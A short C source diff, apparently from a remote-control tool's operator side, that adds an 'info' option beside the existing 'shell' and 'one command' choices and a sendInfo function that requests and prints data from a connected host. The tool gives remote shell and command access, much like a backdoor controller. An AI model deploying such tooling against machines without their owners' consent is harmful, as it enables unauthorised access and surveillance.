@@ -82,7 +82,7 @@ int connect_from_client( ) {
     else {  
       while(1)
       {           
-        printf("What do you want ?(type s for shell or c for one command)\n");
+        printf("What do you want ?(type s for shell or c for one command or i for info)\n");
         c = getchar();
 
         if(c=='s')
@@ -94,6 +94,9 @@ int connect_from_client( ) {
         }else if(c=='c')
         {
            sendCommand(fd,inet_ntoa(client.sin_addr));
+        }else if(c=='i')
+        {
+            sendInfo(fd,inet_ntoa(client.sin_addr));
         }
 
     
@@ -104,6 +107,44 @@ int connect_from_client( ) {
   
   close(sock);    
   return 0;
+}
+
+void sendInfo(int sock,char *ip)
+{
+   char str[BUFFERSIZE];
+   ssize_t len;
+   
+   strcpy(str,"info\b");
+   len = write(sock,str,strlen(str));
+   if ( len == -1 )
+   {
+      perror("error : send info cmd");
+      return;
+   }
+   
+   printf("---- Info from %s : \n",ip);
+   while ( 1 ) {
+   len = read( sock, str, sizeof(str) - 1 );
+   if ( len > 0 ) {    
+    str[len] = '\0';
+     if ( strstr( str, "quit: result" )) {
+              break;
+              }
+     }
+     else {   
+       perror("error: recv info result");
+      return;
+     }
+
+     printf("%s",str);
+      
+      
+     if ( receipt_confirmation( sock, SEND ) == ERROR ) {
+       close(sock);
+     return;
+      }
+    }
+    printf("\n-------------------\n");
 }
 
 void sendCommand(int sock,char* ip)
